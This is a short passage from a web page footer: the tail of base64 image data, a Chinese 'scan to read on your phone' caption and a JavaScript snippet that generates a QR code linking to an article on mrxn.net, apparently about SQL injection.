H7AGTpwGsmqwub93Ansgf++sH1rpqQOB89ED++MuwDzcxzzawrGPONnIKxYvky+DeS3xMulk8q9MeVny4H7i7llqhNHKv7KnDuRqkc0/fgJPHUjugIrguylbqrn4Yy4xuBYINWF6VASOP1FEXHPxkwuCa5IXjrnEysnANUBSNxE49gXGlfipA1ktsLnvncA0EE3+yu61Bk8eThx71R5gXeWqP9bWGFwLM0ZXe8mHU3ulke7KwPXJp4cw3HdQdaNNA/lOw619/gm0gYCnD/fxaht12tFA3y+8MHr51VY8uE90K01yYG000MfiwRwYxcnAMZyYvrcQTj2wlKp/NeB4T6niNpBKbv91J7AH8rqzX678PwAAAP//y4jyPQAAAAZJREFUAwBtE5+kRiyovQAAAABJRU5ErkJggg==)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/api-wxapps-doPageindexCop-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 